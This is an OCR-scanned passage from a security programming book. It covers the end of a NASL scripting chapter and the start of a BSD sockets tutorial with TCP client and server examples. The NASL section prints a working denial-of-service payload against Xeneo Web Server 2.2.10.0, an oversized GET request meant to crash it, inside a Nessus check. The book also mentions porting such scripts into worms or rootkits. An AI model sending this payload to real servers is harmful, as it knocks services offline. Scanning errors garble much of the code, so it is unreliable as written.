closesocket(mysocket); 

NA5L Scripting • Chapter 2 
91 
94 
WSACleanupl) ; 
9 5 
r e t u r n 0 ; 
96 ) 
This buffer overflow targets a flaw in the Xeneo2 Web server by sending a specific 
HTTP GET request with an oversized Bjefemr parameter and a wkatyoutyped variable. It 
is important to understand what the exploit is doing and how it does it, but it is not 
necessary to know everything about the Xeneo2 Web server. 
Begin analyzing the exploit by creating a high-level overview of the program's algo-
rithm: 
1. Open a socket. 
2. 
Connect to remote host on the TCP port passed in as an argument. 
3. 
Send an HTTP GET request with a long referrer string. 
4. 
Verify that the host is no longer responding. 
The pseudo code for this script was already used in an earlier example. Here it is 
again: 
exaniple_exploit (ip, port) 
target_ip = ip 
8 display error and exit if no IP supplied 
target_port = port ft default to 30 if no port was supplied 
local_socket = get an open socket from the local system 
get ip information from host at target_ip 
sock = created socket data struct from gathered information 
my_socket = connect_socket (local_socket, sock) 
string payloatt = HTTP header with very long referrer 
send {my_socket, payload, length(payload) 
exit 
The next step is to port this pseudo-code to NASL foUowing the examples provided 
•' 1 in this chapter and in the other NASL scripts downloaded from ncssus.org. Here is the 
final NASL script: 
Xeneo Web Server 2.2.10.0 DoS 
vulnerable Systems: 
Xeneo Web Server 2.2.10.0 DoS 
Vendor: 
http://www.northernsolutions.com 
Credit: 
Based on an advisory released by badpacket3t and ^Foster 
For Security Protocols Research Labs [April 23, 2003} 
http://security-protocols.com/article.php?sid=1481 
History; 
Xeneo 2.2.9.0 was affected by two separate Dos atttacks: 
(1) Xeneo_Web_Server_2.2.9.0_DoS.nasl 
This DoS attack would kill the server by requesting an overly 
long URL starting with an question mark (such as 
/?AAAAA[ 
JAAAA). 
1 
2 
3 
4 
5 
6 
7 
8 
9 
10 
11 
12 
13 
14 
15 
16 
17 
18 
19 
# 
s 
= 
ft 
ft 
r 
ft 
ft 
ft 
ft 
= 
ft 
= 
ft 
-
ft 
ft 
« 
= 

Chapter 2 • NASL Scripting 
20 
# 
This DoS was discovered by badpack3t and written by Foster 
21 
ft 
but the NASL check was written byv BEKRAR Chaouki. 
22 
# 
(2) Xeneo_Percent_DoS. nasi 
23 # 
This DoS attack would kill the server by requesting "/%A". 
24 # 
This was discovered by Carsten H. Eiram <che@secunia,com>, 
25 
i 
but the NASL check was written by Michel Arboi, 
26 # 
27 
28 
if ( description ) ( 
29 
script_version("^Revision:1.0$"); 
30 
name["english") = "Xeneo Web Server 2.2.10.0 DoS"; 
31 
name["francais"] - "Xeneo web Server 2.2.10.0 DoS"; 
32 
script_name(english:name["english"], francais;name["francais"]); 
33 
34 
desc["english-} - • 
35 This exploit was discovered on the heels of two other DoS exploits affecting Xeneo Web 
Server 2*2.9*0* This exploit performs a slightly different GET request, but the result 
is the same - the xeneo web Server crashes. 
36 
37 Solution : Upgrade to latest version of Xeneo Web Server 
38 Risk factor : High"; 
39 
40 
scr"ipt_description(english;desc [ "english" ] } „-
41 
42 
summary!"english") = "Xeneo Web Server 2.2.10.0 DoS"; 
43 
summary!"francais"J = "Xeneo Web Server 2.2.10.0 DoS"; 
44 
script_summary(english:summary["english"], 
45 
francais:summary["francais"]); 
46 
47 
script_category(ACT_DENIAL); 
48 
49 
script_copyright{english:"No copyright."J; 
50 
51 
family[-english"] = "Denial of Service"; 
52 
family!"francais"J = "Deni de Service"; 
33 
script_family(english:family["english"], 
54 
francais:family["francais"]); 
55 
script_depenclencies ("find_service,nes") ; 
56 
script_require_ports("Services/www",80); 
57 
exit(0); 
58 } 
59 
60 
include{"http_func.inc"); 
61 
62 
port = get_kb_item( "Services/www") ; 
63 
If [ Iport ) port = 30; 
64 
if ( !get_port_state(port) } exit(0); 
65 
66 
if ( safe_checks() ) { 
67 
68 
# safe checks is enabled, so only perform a banner check 
69 
b = get_http_banner(port: port); 
70 
71 
# This should match Xeneo/2.0, 2 . 1 , and 2.2.0-2.2.11 
72 
if ( b =- 'Server: *xeneo/2\\*(([0-1][ \t\r\n.J)|(2(\\*([0-9]|10|11))7[ \ t \ r \ n ] ) ) • ) { 
73 
report = " 
74 Xeneo Web Server versions 2.2.10.0 and below can be 

NA5L Scripting * Chapter 2 
93 
75 crashed by sending a malformed GET request consisting of 
76 several hundred percent signs and a variable called whatyoutyped 
77 with several hundred As• 
78 
79 
**Note that Nessus did not perform a real test and 
80 
-just checked the version number in the banner 
81 
82 
soiuti on : Upgrade to the latest version of the Xeneo Web Server. 
83 Risk factor : High"; 
84 
85 
security_hole(port: port, data: reportJ; 
86 
} 
87 
88 
exit 10}; 
89 
90 
) else < 
91 
tt 
safe_checks is not enabled, so attempt the DoS attack 
92 
93 
if ( http_is_dead(port:port) ) exltfO); 
94 
95 
soc = http_open_socket (port) ; 
96 
iff soc ) ( 
97 
payload = "GET /index.html?testvariable=£nexttestvariable=gif HTTP/1.l\r\n 
98 Referer: 
http://localhost/%*%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%*%%%%%*%%*%%%%%%%%%%%%% 
%%*%%%%%%%*%%%%%%%%%%%*%**%%*%**%%*%*%%*%%*%%*%%*%%%%%%%*%%%%%*%%%%%%%%%%%%%%%%%%%%%**%%*%** 
*%**%*%*%%**%*%%**%*%*%%%%%*%%%%%*%%%%%%%%%%%%%%%%%%%%%%*%%%%%*%%%%*%\r\n 
99 
Content-Type: 
application/x-www-form-urlencoded\r\n 
100 Connection: Keep-Alive\r\n 
101 Cookie: VARIABLE=SPLAB$; path=/\r\n 
102 User-Agent: Mozilla/4.76 [en] (xll; U; Linux 2.4.2-2 i686)\r\n 
103 Variable: 
r e s u l t \ r \ n 
104 Host: 
localhost\r\n 
1 05 Content-length: 
513\r\n 
1 06 Accept: image/git, image/x-xbitmapH image/jpeg, image/pjpegH image/png\r\n 
107 Accept-Encoding; gzip\r\n 
108 Accept-Languagei en\r\n 
1 09 Accept-Charset: iso-8859-1,*.utf-8\r\n\r\n\r\n 
110 
Whatyoutyp 
ed=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA^ 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA^ 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n" ; 
111 
112 
# send the payload1 
113 send(socket:socH data:payload); 
114 
r = http_recv(socket :soc); 
115 
http_close_socket(soc); 
116 
1 17 
£ if the server has gone down, report a severe security hole 
118 if ( http_is_dead(port:port) ) security_hole(port); 
119 
} 
120 
} 

94 
Chapter 2 • NASL Scripting 
Porting from NASL 
It is possible to reverse the process described above and port NASL to other languages. 
There are a few reasons you may want to do this: 
• 
NASL is slower to include Perl or Java than other languages, and significantly 
slower to include C or C + + . T h e Knowledge Base and the performance 
increase between NASLvl and NASL2 offset some of the speed difference, but 
this is still a factor if you have to scan large networks. 
• 
You may want to incorporate the effect of a NASL script into another tool 
{such as a vulnerability assessment tool, worm, virus, or rootkit). 
• 
You may want to run the script via some interface other than through Nessus, 
such as directly from a Web server. 
Unless you are already an expert in the language you are porting to, translating code 
from NASL is more difficult than translating code to NASL.This is because the Nessus 
programming framework, including the Knowledge Base and the NASL library func-
tions, do a lot of the work for you. The socket libraries, regular expression engine, and 
string-searching capabilities can be extremely complicated if you are porting a NASL 
script to a compiled structured language. Even with the use of Perl Compatible Regular 
Expressions (PCRE) within C + + , regular expression matching can take up as much as 
25 lines of code. As far as general complexity goes, sockets are the most difficult to port. 
Depending on which language you will be using, you may have to re-implement many 
basic features or find ways to incorporate other existing network libraries.The following 
are a some rules to remember when porting over NASL scripts to other languages. 
1. 
Set up a vulnerable target system and a local sniffer. The target system will be 
used to test the script and port and the sniffer will ensure that the bits sent on 
the wire are exactly the same. 
2. 
Always tackle the socket creation in the desired port language first. Once you 
have the ability to send the payload, you can focus on payload creation. 
3. 
If you are not using a scripting language that supports regular expressions, and 
the NASL script implements a regular expression string, implement the PCRE 
library for C / C + + . 
4. 
Ensure that the data types used within the script are properly declared when 
ported. 
5. 
In nearly all languages (other than Javascript, Perl, or Java), you should imple-
ment a string class that will make things easier when dealing with attack pay-
loads and target responses. 
6. 
Lastly, your new port needs to do something. Since it cannot use the display 
function call or pass a vulnerable state back to the Nessus engine, you must 
decide the final goal. In most cases a 
VULNERABLE passed to STDOUT is 
acceptable. 

NASL Scripting * Chapter 2 
95 
Summary 
The NASL, similar to and spawned from Network Associates, Inc.'s (NAI's) Custom 
Audit Scripting Language (C'ASL), was designed to power the vulnerability assessment 
backend of the freeware Nessus project (www.nessus.org).The Nessus project, started in 
1998 by Renaud Deraison, was and still remains the most dominant freeware solution to 
vulnerability assessment and management. While Nessus utilizes Networked Messaging 
Application Protocol (NMAP) to invoke most of its host-identification and port-scan-
ning capabilities, it pulls from a global development community to launch the plethora 
of scripts that can identify ranges of vulnerabilities including windows hot-fixes, UNIX 
services, Web services, network device identification, and wireless access point mapping. 
Similar to every other scripting language, NASL is an interpreted language, meaning 
every character counts when parsing. NASL2 is also an object-oriented language where 
users have the ability to implement classes and all the other features that come with 
object-oriented programming (OOP). Upgrading from NASLvl to NASL2 realized 
multiple enhancements, most notably features and overall execution speed. NASL has an 
extremely easy-to-understand-and-utilize API for network communication and sockets, 
in addition to a best-of-breed Knowledge Base implementation that allows scripts to 
share, store, and re-use data from other scripts during execution. Besides the vast number 
of scripts that arc publicly available to use within Nessus, the Knowledge Base is the 
most advanced feature included within the product. Anything from application banners, 
open ports, and identified passwords can be stored within the Knowledge Base. 
In most cases, porting code to NASL is simple, although the longer the script the 
longer it takes to port. Unfortunately, there is no publicly available mechanical translator 
or language-porting tool that can port code from one language to NASL. The most dif-
ficult task is porting NASL code to another desired language. Due to inherent simplicity 
within the language (such as sockets and garbage string creation), it is more difficult to 
port scripts to another language, because while most other languages have increased 
functionality, they also have increased complexity. 
Writing scripts in NASL to accomplish simple to complex tasks can take anywhere 
from minutes, to hours, to days, depending on the amount of research already con-
ducted. In most cases, coding the NASL script is the easiest part of the development life-
cycle. The most difficult part of creating a script is determining the attack sequence and 
the desired responses as vulnerable. NASL is an excellent language for creating security 
scripts and is by far the most advanced, freely available, assessment-focused language. 
Solutions FastTrack 
NASL Script Syntax 
0 Variables do not need to be declared before being used. Variable type 
conversion and memory allocation and de-allocation are handled automatically. 
www.syngress.com 

96 
Chapter 2 • NASL Scripting 
I 
0 Strings can exist in two forms: "pure" and "impure." Impure strings are 
denoted by double-quote characters, and escape sequences are not converted. 
The internal string function converts impure strings to pure strings, denoted 
by single-quote characters, by interpreting escape sequences. For example, the 
string function would convert the impure string "City\tState" to the pure 
string'City State' 
0 Booleans are not implemented as a proper type. Instead,TRUE is defined as 1 
and FALSE is defined as 0. 
Writing NASL Scripts 
0 
NASL scripts can be written to fulfill one of two roles. Some scripts are 
written as tools for personal use to accomplish specific tasks that other users 
may not be interested in. Other scripts check for a security vulnerabilities or 
misconfigu rat ions and can be shared with the Nessus user community to 
improve the security of networks world-wide. 
0 
NASL has dozens of built-in functions that provide quick and easy access to a 
remote host through the TCP and UDP protocols. Functions in this library 
can be used to open and close sockets, send and receive strings, determine 
whether or not a host has gone down after a Denial of Service test, and 
retrieve information about the target host such as the hostname, IP address, and 
next open port. 
0 
If Nessus is linked with OpenSSL, the NASL interpreter provides functions for 
returning a variety of cryptographic and checksum hashes. These include 
MD2, MD4, MD5, RIPEMD160, SHA, and SHA1. 
0 
NASL provides functions for splitting strings, searching for regular expressions, 
removing trailing whitespace, calculating string length, and converting strings 
to upper or lower case. 
NASL Scripts 
0 
0 
In order to share your NASL scripts with the Nessus community, the scripts 
must be modified to include a header that provides a name, a summary, a 
detailed description, and other information to the Nessus engine. 
Using the Knowledge Base is easy for two reasons: 
• 
Knowledge Base functions are trivial and much easier than port scanning, 
manually banner grabbing, or re-implementing any Knowledge Base func-
tionality. 
• 
Nessus automatically forks whenever a request to the Knowledge Base 
returns multiple results. 
www.syngress.com 

NASL Scripting * Chapter 2 
Porting to and from NASL 
0 
Porting code is the process of translating a program or script from one 
language to another. Porting code between two languages is conceptually very 
simple, but can be quite difficult in practice because it requires an 
understanding of both languages. 
0 NASL has more in common with languages such as C and Perl than it does 
with highly structured languages like Java and Python. 
0 
C and NASL are syntactically very similar, and NASLs loosely typed variables 
and convenient high-level string manipulation functions are reminiscent of 
Perl.Typical NASL scripts use global variables and a few functions to 
accomplish their tasks. 
Links to Sites 
For more information, please visit the following Web sites: 
• 
www.nessus.org Nessus' main site is dedicated to the open-source community 
and the further development of Nessus vulnerability detection scripts. 
• 
www.tenablesecurity.com Tenable Security is a commercial start-up informa-
tion security company that is responsible for making vulnerability assessment 
products that leverage the Nessus vulnerability detection scripts. Nessus was 
invented byTenable's Director of Research and Development. 
Frequently Asked Questions 
The following Frequently Asked Questions, answered by the authors of this book, 
are designed to both measure your understanding of the concepts presented in 
this chapter and to assist you with real-life implementation of these concepts. To 
have your questions about this chapter answered by the author, browse to 
www.syngress.com/solutions and click on the "Ask the Author" form. You will 
also gain access to thousands of other FAQsatlTFAQnet.com. 
Q: Can 1 still program scripts to use the NASLvl syntax? 
Al The simple answer is no. However, some NASLvl scripts can be parsed by the 
NASL2 interpreter, while an even smaller amount of NASL2 scripts can be 
parsed using the NASLvl interpreter. NASL2 offers a tremendous increase in 
features, so a good rule of thumb is "learn the new stuff." 
Q: How efficient is NASL compared with Perl or Microsoft's ECMA scripting lan-
guage? 

Chapter 2 • NASL Scripting 
Al NASL is an efficient language but it does not come close to Perl in terms of sup-
port, language features, and speed. With that said, Microsoft's ECMA interpreter 
is the backend technology that drives the Microsoft scripting languages to 
include VBScript and Javascript, and is faster and arguably more advanced than 
Perl.The OOP design is cleaner and easier to deal with, but the one disadvan-
tage is that it is platform-dependant to Windows. 
Q: Are there any mechanical translators to port to or from NASL script? 
A: No. At the time of publishing this book, there were no "publicly" available tools 
to port code to or from NASL. 
Ql Can I reuse objects created within NASL such as other object-oriented pro-
gramming languages? 
A: Because NASL is a scripting language, you can share functions or objects that 
have been developed by cutting and pasting them into each additional script, or 
you can extend the language due to its open source nature. NASL is the 
advanced feature implemented within NASL/Nessus for data sharing between 
NASL scripts. It can be used to share or reuse data between scripts, also known 
as recursive analysis. 
Q: Can 1 run more than one NASL script from the command line simultaneously? 
Al Unfortunately, the answer is no; however, it is easy to script a wrapper for the 
NASL command-line interpreter in something like Perl, that could launch mul-
tiple instances of the interpreter against multiple hosts simultaneously. Most 
would consider this a "poor man's" implementation of parallel scanning. 
Ql What are the most common reasons for using NASL outside of vulnerability 
assessment? 
A: Application fingerprinting, protocol fuzzying, and program identification are the 
three most common vises, although each of these would be best written in 
another language such as C++ or Perl, 

Chapter 3 
BSD Sockets 
• 
Solutions in this Chapter: 
Introduction to BSD Sockets Programming 
TCP Clients and Servers 
UDP Clients and Servers 
• 
Socket Options 
• 
Network Scanning with UDP Sockets 
• 
Network Scanning with TCP Sockets 
• 
Threading and Parallelism 
Related Chapters: Chapter 4, Chapter 5 
El Summary 
El Solutions Fast Track 
El Frequently Asked Questions 

100 
Chapter 3 • BSD Sockets 
Introduction 
Berkeley Software Distribution (BSD) sockets are programming interfaces designed for 
inter-process communication (IPC).This interface is most commonly used by program-
mers to implement network-based communication between one or more computers. 
The Internet Protocol version 4 (IPv4), User Datagram Protocol (UDP),Transmission 
Control Protocol (TCP), and other associated protocols, known collectively as 
TCI V IPv4, are the de facto standards used by BSD sockets for IPC between processes 
running on different network-connected computers. 
The BSD sockets programming interface can be used to implement various IPC 
designs, including one-to-one, one-to-many, and many-to-many communications.These 
are known as client/server or unicast, broadcast, and mulricast communications, respectively. 
In this chapter we take an in-depth look at the BSD sockets programming facility, 
including standard UDP and TCP client/server programming, fine tuning sockets with 
socket options and touch upon the applications of multi-threading in network 
programming. 
NOTE_ 
All of the example source code in this chapter was written and compiled on 
OpenBSD 3.2 / x86 using the GNU C compiler version 2.95.3 and the tcsh com-
mand shell version 6.12.00. 
Introduction to 
BSD Sockets Programming 
The BSD sockets programming facility is a collection of programming language func-
tions and data types, which is known as the BSD sockets application programming inter-
face (API).This facility was first introduced with the BSD UNIX operating system in 
the early 1980s, but is now available on most UNIX-like operating systems and sup-
ported on the Microsoft Windows platform (Winsock). 
The BSD sockets API is widely used in conjunction with the C programming lan-
guage to implement TCP or UDP support in software. Two basic types of applications 
use the BSD sockets API: client and server. Client applications use the API to create an 
endpoint for communication and to initiate communication with remote server applica-
tions. Server applications, in turn, sit idle, waiting for communication from remote client 
applications. 
Both client and server roles revolve around the concept of a communication end-
point known as a "socket." A socket uniquely identifies a single communication end-
point by using the socket(} function. The details of the endpoint are further defined using 
functions such as counectQ or bind(). Ultimately, the client-defined endpoint is connected 
to a server-defined endpoint and communication ensues. In the case of UDP and TCP, 
an endpoint is the combination of the local or remote IP address and the port. 

BSD Sockets • Chapter 3 
The typical procedure for creating a client socket is to call the socketQ function, 
which allocates resources for the socket within the host operating system, including a 
socket identifier and a local port.This step is followed by defining the remote host and 
port to which the socket should be connected.The socket is then connected to the 
remote port using the connectQ function. After a successful connection, data can be trans-
ferred, read from the local port using APIs such as rcadQ or recvQ, or sent to the remote 
port using APIs such as write() and send(), 
TCP Clients and Servers 
TCP is the most commonly used protocol of the TCP/IP protocol suite. This section 
looks at two examples that illustrate how TCP client and server sockets are created. 
Example 3.1 illustrates how a TCP client connection is created, established, and ter-
minated to a remote port. 
Example 3.1 TCP Client (dientl.c) 
1 
/• 
2 
* clientl.c 
3 
* 
4 
* Establish TCP 
client 
connection & 
5 
* terminate connection using socket(), 
6 
« connect!) and close!) functions. 
7 
* 
8 
-
9 
• 
10 
• / 
11 
12 
Sinclude <stdio.h> 
13 
tinclude <sys/types.h> 
14 
#include <sys/socket.h> 
1 5 #include <netinet/in.h> 
16 
17 
int 
18 main 
(int argcr char *argv[] ) 
19 t 
20 
struct sockaddr_in sin; 
21 
int sock = 0; 
22 
int ret 
e 0; 
23 
24 
iflargc != 3) 
25 
{ 
26 
printf("usage: %s: ip_address port\n", argv[0)); 
27 
return(l); 
28 
) 
29 
30 
sock = socket(AF_INET, SOCK_STREAM, 0); 
31 
if (sock < 0) 
32 
{ 
33 
printf("TCP client socket() failed•\n") s 
34 
return (1); 
35 
) 
36 
37 
memset (&SITI, 0x0 r sizeof (struct sockaddr_in *)) ; 

Chapter 3 • BSD Sockets 
38 
39 
s i n - s i n _ f a m i l y = AF_INET; 
40 
S i n . s i n _ p o r t = h t o n s ( a t o i ( a r g v [ 2 ] ) ) ; 
41 
sin,sin_addr,s_addr = inet_addr(argv[l]); 
42 
43 
ret = connect (sock, struct sockaddr M&sin, 
44 
sizeof(struct sockaddr); 
45 
i f ( r e t < 0) 
46 
{ 
47 
printf("TCP client connectU failed.\n"); 
48 
close (sock); 
49 
return(l); 
50 
} 
51 
52 
printf f "TCP client connected. \nHI) ; 
53 
c l o s e ( s o c k ) ; 
54 
55 
printf("TCP client connection closed.\n"); 
56 
57 
return(O); 
58 
} 
Compilation 
(foster@£-yngress -/book) $ gcc -o clientl clientl.c 
(foster@syngress -/bookJ $ , /clientl 
usage: ./clientl: ip_address port 
Example Execution 
(foster@syng.ress -/book) $ ./clientl 127.0.0.1 SO 
TCP client connected. 
TCP client connection closed. 
(fcsterSsyngress -/book) $ ./clientl 127.0,0.1 81 
TCP client connect!) failed-
The clientl.c program requires two command-line arguments: the IP address and the 
port the client should connect to. It allocates a socket identifier and connects the socket 
to the specified remote IP address and port. No data is transferred.The socket is then 
closed. If a connection cannot be established to the specified IP address and port, an 
error message is printed and the program exits. 
Analysis 
• 
At line 30, the program allocates a socket identifier by calling the sockctQ func-
tion. AF_INET is passed as the domain argument, indicating that this socket 
will use IP for its underlying transport. SOC2K_STREAA4 is passed as the type 
argument, indicating that this socket will use the TCP protocol for transport-

BSD Sockets • Chapter 3 
103 
layer communication. Zero is passed as the protocol value, because this argu-
ment is not typically used when allocating a TCP socket. 
• 
At line 37, the sockaddr_iu structure is initialized and used to define die remote 
endpoiiit that the socket will be connected to. 
• 
At line 39, the family (domain) for the remote endpoiiit is specified as 
AF_I\!ET, whose value matches that passed to the socket() function at line 28. 
• 
At line 40, the remote port to which the socket will be connected is specified. 
The port is specified on the command line and is passed to the program as a 
character array (char *). The port value is then converted to a 4-byte integer 
(hit) value using the atoiQ function.The integer port value is then converted to 
a 2-byte short value in network byte order,This value is then assigned to the 
sockaddr_h\ structure's iin_port member. 
• 
At line 41, the remote IP address to which the socket will be connected is 
specified on the command line and passed to the program as a character array 
(cliar *), This string value is then converted to its unsigned 32-bit value equiv-
alent. The inet_addr() function is used to convert the character array value to 
the unsigned 32-bit value.This value is then assigned to the scckaddf_iti struc-
ture's shi_addr.s_addr member. 
• 
At lines 43 and 44, the socket is connected to the remote host and port. At this 
point, the three-way handshake takes place. 
• 
At line 53, the connected socket is closed and connection termination occurs. 
e
Example 3.2 illustrates how aTCP server socket is created.The server socket serves 
as an endpoiiit that TCP clients such as the client illustrated in client I.c can connect to. 
Example 3.2 TCP Server (server!.c) 
1 
2 
3 
4 
5 
6 
7 
8 
9 
10 
11 
12 
13 
14 
15 
16 
17 
18 
19 
20 
21 
22 
/* 
* 
* 
* 
* 
+ 
* 
* 
* 
server1.c 
Create TCP server socket, accept 
one TCP client 
connection using 
socket(), 
bincH ), 
listen(J and 
accept(). 
foster < jamescfc-ster@gmail , com* 
V 
#include 
ttinclude 
#include 
#include 
1;-. t 
main 
{ 
<stdioTh> 
<sys/types.h> 
<sys/socket.h> 
<netinet/in,h> 
(int argc, Char *^rgv[]) 
struct sockaddr_in sin ; 
struct sockaddr_in csirw 
socklen_t 
len 
= 

BSD Sockets 
short 
port 
= 0 
int 
csock = 0 
int 
SOCk = 0 
int 
ret 
= 0 
if (argc 1= 2) 
( 
printf("usage; %s; port\n", argv[Q]); 
return(1); 
) 
port = atoi(argv[l]); 
sock = socket(AF_lNET, SOCK_STREAM, 0); 
if(sock < 0) 
t 
printf("TCP server socket() failed.\n*) ; 
return(1) ; 
} 
memset(isin, 0x0, sizeof(struct sockaddr_in * J); 
.gin_faniily 
= AF_INET; 
s i n t s i n _ p o r t 
= h t o n s ( p o r t ) ; 
sin.sin_addr.s_addr = IWADDR_ANY; 
ret = bind(sock, (struct sockaddr M&sin, 
(struct sockaddr)}j 
if(ret < 0) 
( 
printf("TCP server bind() failed.\n"); 
close (sock); 
return(1 
) ; 
) 
ret = listen(sock, 5); 
if(ret < 0} 
C 
printf("TCP server listen() failed.\n"); 
close (sock); 
return(1 
); 
> 
printf("TCP server listening.\n") ; 
memset(fccsinH Qx0H Sizeof(struct Sockaddr}); 
csock = accept(sock, (struct sockaddr *)&csin, felen) 
if(csock < 0) 
[ 
printf ('TCP server accept () failed An") ; 
} 
else 
{ 
printf("TCP server: TCP client connection • 
"on port 4dAn"p port); 
close(csock): 

BSD Sockets • Chapter 3 
105 
80 
81 
82 
close (sock); 
83 
84 
return(O); 
85 > 
Compilation 
(fostergsyngress -/book) $ gcc -o serverl serverl.c 
(foster@syngress -/book) $ ./serverl 
usage: ./serverl: port 
Example execution 
(foster@syngress -/book) $ ./serverl 4001 
TCP server listening. 
serverl.cis a simpleTCP server program whose only command-line argument is the 
port to which the server listens for incoming TCP client connections. The program first 
allocates a socket identifier using the socket() function, then binds to the specified port 
and calls the acceptQ function, which waits for a TCP client connection. Once a connec-
tion has been received, the TCP client connection is closed, the server socket is closed, 
and the program is terminated. 
Analysis 
• 
At line 36, the program allocates a socket identifier by calling the socketQ func-
tion. AF_INET is passed as the domain argument, indicating that this socket 
will use IP for its underlying transport. SOCK_STREAM is passed as the type 
argument, indicating that this socket will use TCP for transport-layer commu-
nication, Zero is passed as the protocol value because this argument is not typi-
cally used when allocating a TCP socket. 
• 
At line 43, the sockaddr_in structure is initialized and used to define the local 
endpoint to which the socket will be bound. 
• 
At line 45, the family (domain) for the local endpoint is specified as 
/lF_/j\77T.This value matches that passed to the socketQ function at line 36. 
• 
At line 46, the local port that the socket will be bound to is specified. The port 
is specified on the command line and is passed to the program as a character 
array {char *).The port value is then converted to a 4-byte integer (//if) value 
using the atoiQ function.The integer port value is then converted to a 2-byte 
short value in network byte order.This value is then assigned to the socketddr_in 
structure's s'ut_port member. 
• 
At line 47, the local IP address that the socket will be bound to is specified. 
The unsigned integer constant li\ADDR_ANY is used.This value indicates 
that the socket should be bound to all available network interfaces, including 

106 
Chapter 3 • BSD Sockets 
the toopback interface. In contrast to the use of INADDR_ANY, if a host has 
more than one network interface, the socket can be bound to only one of the 
interfaces if the IF address assigned to the desired interface is supplied in place 
of 
INADDR_Ai\Y. 
• 
At line 49, the iritidQ function call is used to assign local endpoint information, 
including the local IP address and port, to the socket descriptor. 
• 
At line 58, the UstenQ function call is used to indicate the number ofTCP 
client connections that can be queued before new connections are refused. It is 
also used to indicate that the socket is ready to accept incoming connections. 
At this point,TCP client connections are processed. 
• 
At line 70, the acceptf) function call is used to accept incomingTCP client con-
nections. When called, the accept() function waits (blocks) for new TCP client 
connections. When a new TCP client connection is received, the accept () func-
tion returns a socket descriptor representing the new connection. 
• 
At line 79, accept () will have returned a valid socket descriptor in response to a 
TCP client connection. In this example, the client socket is then closed. 
• 
At line 82, the server socket is closed, thus disallowing any further TCP client 
connections to the server socket. 
Example 3.3 executes the server t program followed by the dient! program, and 
observes the output, server! will allocate a socket descriptor, bind to the port supplied on 
the command line, and then listen for incomingTCP client connections. Upon exe-
cuting client 1, a TCP connection will be established between the client 1 program and the 
serverl program. Following this, both programs will close their ends of the connection 
and terminate, 
Example 3.3 TCP Client and Server in Action 
1{fosteresyngress -/book} 5 ./serverl 4001 & 
2./serverl 4001 U [1] 31802 
3 
4(£osteresyngresa -/book) $ ./client1 127.0.0.1 4001 
5 ,/clientl 127.0.0.1 4001 
7 TCP server: TCP client connection on port 4001. 
8 
9 TCP client connected, 
10 
11 [1] 
Done 
./serverl 4001 
Analysis 
The serverl program was executed and instructed to bind to and listen on TCP port 
4001. On most operating systems, ports 1 through 1024 are restricted for use by privi-
leged programs; thus, a port above 1024 is used in this example.The Vr character is 
included at the end of the command-line statement to indicate that the server! program 

BSD Sockets • Chapter 3 
107 
should be run as a background process, thus allowing the command line to become 
immediately available so that the client! program can be executed. 
• 
At line 1, theTCSH shell prints out the command entered. 
• 
At line 2, theTCSH shell prints out the process ID for the server! background 
process. 
• 
At line 4, the client1 program is wxecutect. An IF address of 127.0.0.1 and a port 
of 4001 is supplied. IP address 127.0.0.1 is known as the loopback address and 
is assigned to the loopback interface.The loopback interface is a logical net-
work interface that is only accessible by programs running on the local host. In 
fact, most systems alias the DNS name "localhost" with the IP address 
127.0.0.1. 
• 
At line 5, the TCSH shell prints out the command entered. 
• 
At line 7, server! prints out a message indicating that it has received a TCP 
client connection, which is from the client 1 program. 
• 
At line 9, dientl prints out that it has established a connection to the server 1 
program. 
Now that you understand the basics ofTCP client and server socket programming, 
let's turn to UDP socket programming, 
UDP Clients and Servers 
UDP socket programming employs many of the same techniques that are used for TCP 
socket programming. However, UDP is a connectionless protocol, requires less setup, and 
is somewhat more flexible in sending and receiving UDP datagrams. UDP is not a byte-
stream protocol and treats all data as an individual datagram. 
The UDP protocol header consists of only four fields: destination port, source port, 
length, and checksum. The destination and source ports uniquely identify the local and remote 
processes that the data should be sent to or received from.The length field indicates the 
number of bytes of data included in the datagram. The checksum field is optional and may 
be zero or may contain a valid checksum value. 
As with TCP sockets, a UDP socket descriptor is created using the socket() function. 
However, unique to UDP sockets is the ability to send and receive datagrams to or from 
various hosts using a single socket descriptor. 
The typical procedure for creating a UDP client socket is to call the sockctQ func-
tion.This is then followed by a definition of the remote host and port that the socket 
should send to or receive data from. The socket is passed to the connectQ function, which 
instructs further calls involving the socket descriptor to send or receive data from the 
specified host. Alternatively, the target host and port that the data should be sent to may 
be specified with each "write" of data, allowing for the socket descriptor to be used to 
send data to more than one host. 

108 
Chapter 3 • BSD Sockets 
* N ^ H L i S 
UDP data is sent using the writeQ, sendf), and sendtoQ functions. If the writeQ or sendQ 
functions are used, the UDP socket must have been previously passed to the coiiiwctQ 
function. Otherwise, the send to () function can be used to specify the destination IP 
address and port at the time of the function call. UDP data is read usint; the mid(), rea>(), 
and rccvfromQ functions. If the rcadQ or rccvQ functions are used, the UDP socket must 
have been previously passed to the conucctf) function. Otherwise, the recyfromQ function 
can be used to obtain the source IP address and source port of a received datagram at 
the time of the function call. 
Data written to or read from a UDP socket is sent and received as a single unit. 
Unlike TCP, data is not treated as a stream of bytes. Each call to writcQm, scnd(), or 
snidtoQ produces a single UDP datagram on the wire. Received datagrams are also read 
in a single operation. If insufficient buffer space is provided when attempting to read a 
datagram, the read function used will return an error code indicating as such. 
If a UDP datagram exceeds the maximum segment size of the local network or any 
network it must traverse to reach its destination, the datagram must be fragmented.This 
is undesirable for performance reasons and therefore may be restricted or unsupported 
by some operating systems. Example 3.4 illustrates how to create a UDP socket. 
Example 3.4 UDP Socket (udpl.c) 
1 /• 
2 
* udpi.c 
3 * 
4 
* create UDP socket example program ttl 
5 * 
6 
* foster -cjamescfosteregTrLail .com> 
7 v 
8 
9 
#include <stdio.h> 
10 
11 #include <sys/socket ,b 
12 ttinclude <netinet/in.h> 
13 
